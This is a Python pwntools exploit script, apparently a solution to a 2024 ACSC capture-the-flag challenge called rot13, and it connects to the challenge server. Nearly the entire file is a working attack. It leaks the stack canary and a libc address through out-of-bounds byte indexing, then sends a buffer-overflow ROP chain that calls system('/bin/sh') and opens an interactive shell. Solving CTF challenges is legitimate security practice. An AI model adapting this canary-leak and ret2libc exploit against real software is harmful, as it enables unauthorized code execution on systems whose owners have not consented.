from pwn import *
from icecream import ic

exe = ELF("./rot13_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("rot13.chal.2024.ctf.acsc.asia", 9999)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# payload = b""
# for i in range(0x7f, 0xff):
#     payload += p8(i)


# ru("Text:")
# sl(payload)

# re(0x10)
# re(0x10)
# libc_leak = u64(re(8))
# re(0x59)
# canary = u64(re(8))
# re(7)
# leak3 = u64(re(8))

payload = b""
for i in range(0xe8, 0xf0):
    payload += p8(i)

ru("Text:")
sl(payload)
ru("Result: ")
canary = u64(re(8))

payload = b""
for i in range(0xe8-80, 0xf0-80):
    payload += p8(i)

ru("Text:")
sl(payload)
ru("Result: ")
libc_leak = u64(re(8))

# libc_leak = libc_leak >> 8

ic(hex(libc_leak))
ic(hex(canary))
# ic(hex(leak3))

libc.address = libc_leak-0x21b780
binsh = libc.address + 0x1d8678
ret = libc.address + 0x0000000000029139
pop_rdi = libc.address + 0x000000000002a3e5
payload = b'a'*0x108
payload += p64(canary)
payload += b'a'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])
ic(hex(libc.symbols['system']))

ru("Text:")
sl(payload)

ru("Text:")
s('\n')

io.interactive()
